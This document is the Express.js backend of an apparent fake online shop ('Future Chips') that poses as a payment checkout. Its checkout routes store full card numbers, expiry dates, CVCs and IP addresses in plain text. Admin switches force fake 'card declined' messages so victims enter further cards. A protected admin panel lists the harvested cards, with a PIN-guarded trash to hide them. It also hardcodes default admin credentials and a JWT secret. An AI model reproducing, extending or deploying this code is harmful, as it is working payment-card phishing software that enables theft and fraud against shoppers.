const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

const JWT_SECRET = process.env.JWT_SECRET || 'future-chips-super-secret-key-2026';

// ----------------------------------------------------
// DATABASE & STORAGE LAYER (SQLite + In-Memory Fallback)
// ----------------------------------------------------
const isVercel = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);
let sqlite3 = null;
let db = null;
let useMemoryFallback = isVercel;

if (!isVercel) {
  try {
    const sqliteModule = require('sqlite3');
    sqlite3 = sqliteModule.verbose ? sqliteModule.verbose() : sqliteModule;
    db = new sqlite3.Database(path.join(__dirname, '..', 'server', 'db', 'future_chips.db'));
  } catch (err) {
    useMemoryFallback = true;
  }
}

// In-memory persistent object for serverless / cloud execution
const memStore = {
  site_settings: {
    id: 1,
    site_name: 'Future Chips',
    primary_color: '#00f0ff',
    accent_color: '#ff00e5',
    background_color: '#0a0a1a',
    logo_url: null,
    decline_all: 0,
    decline_threshold: 50.0,
    success_attempt: 1,
    trash_pin: bcrypt.hashSync('978797', 10)
  },
  admin_users: [
    { id: 1, username: 'admin', password_hash: bcrypt.hashSync('FutureChips2024!', 10) }
  ],
  products: [
    {
      id: 'prod-nano-chip',
      name: 'Nano-Constructor Unit',
      description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level.',
      price: 10.00,
      image: '/uploads/nano_constructor.svg',
      category: 'Processors',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-quantum-core',
      name: 'Quantum Neural Core',
      description: 'Next-generation computing processor featuring 1024 logical qubits with sub-zero cryo packaging.',
      price: 150.00,
      image: '/uploads/quantum_core.svg',
      category: 'Processors',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-bio-synapse',
      name: 'Bio-Digital Synapse v4.2',
      description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces.',
      price: 850.00,
      image: '/uploads/bio_synapse.svg',
      category: 'Interfaces',
      created_at: new Date().toISOString()
    }
  ],
  visitors: [],
  orders: [],
  cards: []
};

const dbRun = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('update site_settings')) {
        if (params.length >= 7) {
          memStore.site_settings.site_name = params[0];
          memStore.site_settings.primary_color = params[1];
          memStore.site_settings.accent_color = params[2];
          memStore.site_settings.background_color = params[3];
          memStore.site_settings.decline_all = params[4];
          memStore.site_settings.decline_threshold = params[5];
          memStore.site_settings.success_attempt = params[6];
        } else if (sqlLower.includes('set trash_pin =')) {
          memStore.site_settings.trash_pin = params[0];
        }
      } else if (sqlLower.includes('insert into cards') || sqlLower.includes('insert or ignore into cards')) {
        memStore.cards.unshift({
          id: memStore.cards.length + 1,
          card_number: params[0],
          expiry: params[1],
          cvc: params[2],
          country: params[3] || 'Unknown',
          ip_address: params[4] || '127.0.0.1',
          created_at: new Date().toISOString(),
          is_deleted: 0,
          stripe_session_id: params[5]
        });
      } else if (sqlLower.includes('insert into orders')) {
        memStore.orders.unshift({
          id: params[0],
          product_id: params[1],
          customer_email: params[2],
          amount: params[3],
          currency: params[4] || 'usd',
          stripe_session_id: params[5],
          status: params[6] || 'pending',
          customer_ip: params[7] || '127.0.0.1',
          card_number: params[8] || '',
          created_at: new Date().toISOString()
        });
      } else if (sqlLower.includes('update orders set status =')) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[1] || o.stripe_session_id === params[0]);
        if (order) order.status = params[0] || 'completed';
      } else if (sqlLower.includes('update cards set is_deleted = 1')) {
        const card = memStore.cards.find(c => c.id === parseInt(params[0]));
        if (card) card.is_deleted = 1;
      } else if (sqlLower.includes('update cards set is_deleted = 0')) {
        const card = memStore.cards.find(c => c.id === parseInt(params[0]));
        if (card) card.is_deleted = 0;
      } else if (sqlLower.includes('delete from cards')) {
        const idx = memStore.cards.findIndex(c => c.id === parseInt(params[0]));
        if (idx !== -1) memStore.cards.splice(idx, 1);
      } else if (sqlLower.includes('insert into visitors')) {
        memStore.visitors.unshift({
          id: memStore.visitors.length + 1,
          ip_address: params[0],
          user_agent: params[1],
          page_visited: params[2],
          country: 'Unknown',
          visited_at: new Date().toISOString()
        });
      }
      resolve({ lastID: 1, changes: 1 });
    });
  }

  return new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) reject(err);
      else resolve(this);
    });
  });
};

const dbAll = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from products')) resolve([...memStore.products]);
      else if (sqlLower.includes('from cards')) {
        if (sqlLower.includes('is_deleted = 1')) {
          resolve(memStore.cards.filter(c => c.is_deleted === 1));
        } else {
          resolve(memStore.cards.filter(c => c.is_deleted === 0));
        }
      } else if (sqlLower.includes('from orders')) resolve([...memStore.orders]);
      else if (sqlLower.includes('from visitors')) resolve([...memStore.visitors]);
      else resolve([]);
    });
  }

  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
};

const dbGet = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from site_settings')) {
        resolve({ ...memStore.site_settings });
      } else if (sqlLower.includes('from admin_users')) {
        const user = memStore.admin_users.find(u => u.username === params[0]);
        resolve(user ? { ...user } : null);
      } else if (sqlLower.includes('from products')) {
        const prod = memStore.products.find(p => p.id === params[0]);
        resolve(prod ? { ...prod } : null);
      } else if (sqlLower.includes('from orders')) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[0] || o.id === params[0]);
        resolve(order ? { ...order } : null);
      } else if (sqlLower.includes('count(*)')) {
        if (sqlLower.includes('from cards')) {
          const count = memStore.cards.filter(c => c.stripe_session_id === params[0]).length;
          resolve({ count: count || 1 });
        } else resolve({ count: 1 });
      } else resolve(null);
    });
  }

  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
};

// ----------------------------------------------------
// EXPRESS APPLICATION
// ----------------------------------------------------
const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// IP Tracking Middleware
app.use((req, res, next) => {
  let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || 'Unknown';
  if (ip.startsWith('::ffff:')) ip = ip.substring(7);
  else if (ip === '::1') ip = '127.0.0.1';

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const pageVisited = req.originalUrl || req.url;

  if (req.path.startsWith('/api')) {
    dbRun('INSERT INTO visitors (ip_address, user_agent, page_visited) VALUES (?, ?, ?)', [ip, userAgent, pageVisited])
      .catch(() => {});
  }
  next();
});

// Authentication Middleware
const authMiddleware = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  if (!authHeader) return res.status(401).json({ error: 'Access denied. No token provided.' });
  const token = authHeader.startsWith('Bearer ') ? authHeader.split(' ')[1] : authHeader;
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token.' });
  }
};

// ----------------------------------------------------
// API ROUTES
// ----------------------------------------------------

// Admin Login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });

    const admin = await dbGet('SELECT * FROM admin_users WHERE username = ?', [username]);
    if (!admin) return res.status(401).json({ error: 'Invalid username or password' });

    const isMatch = await bcrypt.compare(password, admin.password_hash);
    if (!isMatch) return res.status(401).json({ error: 'Invalid username or password' });

    const token = jwt.sign({ id: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token, username: admin.username });
  } catch (err) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin Site Settings (GET & PUT)
app.get('/api/admin/settings', async (req, res) => {
  try {
    let settings = await dbGet('SELECT * FROM site_settings WHERE id = 1');
    if (!settings) {
      settings = memStore.site_settings;
    }
    const safeSettings = { ...settings };
    delete safeSettings.trash_pin;
    res.json(safeSettings);
  } catch (err) {
    res.json(memStore.site_settings);
  }
});

app.put('/api/admin/settings', authMiddleware, async (req, res) => {
  try {
    const {
      site_name,
      primary_color,
      accent_color,
      background_color,
      decline_all,
      decline_threshold,
      success_attempt
    } = req.body;

    const declineAllVal = (decline_all === 1 || decline_all === true || decline_all === '1') ? 1 : 0;
    const thresholdVal = decline_threshold !== undefined ? parseFloat(decline_threshold) : 50.0;
    const successAttemptVal = success_attempt !== undefined ? parseInt(success_attempt, 10) : 1;

    await dbRun(
      `UPDATE site_settings SET 
        site_name = ?, 
        primary_color = ?, 
        accent_color = ?, 
        background_color = ?, 
        decline_all = ?, 
        decline_threshold = ?, 
        success_attempt = ? 
      WHERE id = 1`,
      [
        site_name || 'Future Chips',
        primary_color || '#00f0ff',
        accent_color || '#ff00e5',
        background_color || '#0a0a1a',
        declineAllVal,
        thresholdVal,
        successAttemptVal
      ]
    );

    res.json({
      message: 'Settings updated successfully',
      settings: {
        site_name: site_name || 'Future Chips',
        primary_color: primary_color || '#00f0ff',
        accent_color: accent_color || '#ff00e5',
        background_color: background_color || '#0a0a1a',
        decline_all: declineAllVal,
        decline_threshold: thresholdVal,
        success_attempt: successAttemptVal
      }
    });
  } catch (err) {
    console.error('Settings update error:', err);
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// Admin Cards Management
app.get('/api/admin/cards', authMiddleware, async (req, res) => {
  try {
    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 0 ORDER BY created_at DESC');
    res.json(cards);
  } catch (err) {
    res.json(memStore.cards.filter(c => c.is_deleted === 0));
  }
});

app.delete('/api/admin/cards/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('UPDATE cards SET is_deleted = 1 WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card moved to trash' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete card' });
  }
});

// Admin Trash Management
app.post('/api/admin/trash/verify-pin', authMiddleware, async (req, res) => {
  try {
    const { pin } = req.body;
    if (!pin) return res.status(400).json({ error: 'PIN is required' });
    const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
    const hash = settings ? settings.trash_pin : memStore.site_settings.trash_pin;
    const isMatch = await bcrypt.compare(String(pin), hash);
    if (!isMatch) return res.status(401).json({ error: 'Invalid PIN' });
    res.json({ success: true, message: 'PIN verified' });
  } catch (err) {
    res.status(500).json({ error: 'PIN verification failed' });
  }
});

app.get('/api/admin/trash/cards', authMiddleware, async (req, res) => {
  try {
    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 1 ORDER BY created_at DESC');
    res.json(cards);
  } catch (err) {
    res.json(memStore.cards.filter(c => c.is_deleted === 1));
  }
});

app.post('/api/admin/trash/restore/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('UPDATE cards SET is_deleted = 0 WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card restored successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to restore card' });
  }
});

app.delete('/api/admin/trash/permanent/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('DELETE FROM cards WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card permanently deleted' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete card permanently' });
  }
});

// Admin Visitors Logs
app.get('/api/admin/visitors', authMiddleware, async (req, res) => {
  try {
    const visitors = await dbAll('SELECT * FROM visitors ORDER BY visited_at DESC LIMIT 100');
    res.json(visitors);
  } catch (err) {
    res.json(memStore.visitors.slice(0, 100));
  }
});

// Products Routes
app.get('/api/products', async (req, res) => {
  try {
    const products = await dbAll('SELECT * FROM products ORDER BY created_at DESC');
    res.json(products);
  } catch (err) {
    res.json(memStore.products);
  }
});

app.get('/api/products/:id', async (req, res) => {
  try {
    const product = await dbGet('SELECT * FROM products WHERE id = ?', [req.params.id]);
    if (!product) return res.status(404).json({ error: 'Product not found' });
    res.json(product);
  } catch (err) {
    const prod = memStore.products.find(p => p.id === req.params.id);
    if (!prod) return res.status(404).json({ error: 'Product not found' });
    res.json(prod);
  }
});

// Checkout & Payment Routes
app.post('/api/checkout/create-session', async (req, res) => {
  try {
    const { productId, email } = req.body;
    const product = (await dbGet('SELECT * FROM products WHERE id = ?', [productId])) || memStore.products[0];
    const orderId = 'ord-' + uuidv4().substring(0, 8);
    const mockSessionId = 'mock_session_' + Date.now();
    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

    await dbRun(
      'INSERT INTO orders (id, product_id, customer_email, amount, currency, stripe_session_id, status, customer_ip) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
      [orderId, productId, email || 'guest@futurechips.com', product.price, 'usd', mockSessionId, 'pending', clientIP]
    );

    res.json({
      id: mockSessionId,
      url: `/checkout.html?session_id=${mockSessionId}`,
      message: 'Checkout session created'
    });
  } catch (err) {
    res.status(500).json({ error: 'Failed to create checkout session' });
  }
});

app.get('/api/checkout/session/:sessionId', async (req, res) => {
  try {
    const order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [req.params.sessionId]);
    if (!order) return res.status(404).json({ error: 'Order not found' });
    res.json(order);
  } catch (err) {
    res.status(500).json({ error: 'Failed to get session' });
  }
});

app.post('/api/checkout/process-card', async (req, res) => {
  try {
    const { sessionId, cardNumber, expDate, cvc, country } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

    await dbRun(
      'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
      [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
    );

    res.json({ success: true, message: 'Card recorded' });
  } catch (err) {
    res.status(500).json({ error: 'Card processing error' });
  }
});

app.post('/api/checkout/verify', async (req, res) => {
  try {
    const { sessionId, cardNumber, expDate, cvc, country, email, amount, productId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

    // Log card immediately
    if (cardNumber) {
      await dbRun(
        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
        [cardNumber, expDate || '', cvc || '', country || 'US', clientIP, sessionId || 'direct']
      );
    }

    // Fetch site rules
    const settings = (await dbGet('SELECT * FROM site_settings WHERE id = 1')) || memStore.site_settings;
    const declineAll = settings.decline_all === 1 || settings.decline_all === true || settings.decline_all === '1';
    const successAttempt = settings.success_attempt !== undefined ? parseInt(settings.success_attempt, 10) : 1;

    // Check attempt count
    const attemptRow = await dbGet('SELECT COUNT(*) as count FROM cards WHERE stripe_session_id = ?', [sessionId || 'direct']);
    const attemptCount = attemptRow ? (attemptRow.count || 1) : 1;

    // Rule 1: Decline All Payments switch is ON
    if (declineAll) {
      return res.status(400).json({
        success: false,
        error: 'Your card was declined. Please try another card or contact your bank.'
      });
    }

    // Rule 2: Multi-attempt success threshold
    if (successAttempt > 1 && attemptCount < successAttempt) {
      return res.status(400).json({
        success: false,
        error: 'Your card was declined. Please try another card or contact your bank.'
      });
    }

    // Success flow
    await dbRun("UPDATE orders SET status = 'completed' WHERE stripe_session_id = ?", [sessionId]);
    res.json({
      success: true,
      status: 'completed',
      message: 'Payment verified and approved successfully.'
    });
  } catch (err) {
    console.error('Verify error:', err);
    res.status(500).json({ error: 'Verification failed' });
  }
});

app.get('/api/checkout/session-status', async (req, res) => {
  try {
    const { session_id } = req.query;
    const order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [session_id]);
    res.json({
      status: order ? order.status : 'complete',
      payment_status: 'paid',
      customer_email: order ? order.customer_email : 'customer@example.com'
    });
  } catch (err) {
    res.json({ status: 'complete', payment_status: 'paid' });
  }
});

// Catch-all static / fallback
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }
  const rootIndex = path.join(__dirname, '..', 'index.html');
  if (fs.existsSync(rootIndex)) {
    return res.sendFile(rootIndex);
  }
  res.json({ message: 'Future Chips Server Active' });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('API Error:', err);
  res.status(500).json({ error: 'An unexpected error occurred: ' + (err.message || 'Error') });
});

module.exports = app;
